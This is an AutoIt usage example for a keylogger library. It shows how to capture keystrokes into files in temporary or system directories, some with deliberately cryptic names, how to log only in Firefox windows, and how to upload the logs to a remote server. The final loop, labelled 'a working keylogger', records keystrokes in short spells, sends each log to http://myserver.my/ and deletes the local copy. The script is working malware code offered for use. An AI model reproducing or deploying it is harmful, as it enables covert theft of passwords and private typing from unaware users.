; This Script demonstrates how the keylogger can be used
#include <Keylogger.au3> ; Including the Keylogger

; Creates a File called "keylog-output.html" in the users temporary directory. Logs endlessly
_initWithFilename(@TempDir, "keylog-output")
_run() ; After "_run()" is executed the programm is stuck in a loop

; Creates a File with a rather cryptic name in the useres System directory
_init("") ; Using an empty-string as parameter means you create a file where your executable is stored
_run()

; Logs only when the user types in a window with "Firefox" in the title
_initWithFilename(@TempDir, "keylog-output")
_logWindow("Firefox")

; With the _read()-function you can make your own conditional loops
While not ($key == "ESC")
  _read()
WEnd

; You can send your logs to a server. The server has to run receive.php
_send("http://myserver.my/receive.php/")

; This example is a working keylogger. It will create a new temporary file and send it to the server short intervalls
While 1
	_init(@TempDir)
	_runFor(2000)
	_send("http://myserver.my/") ; Assuming that the php-script is called "index.php"
	_deleteFile()
WEnd
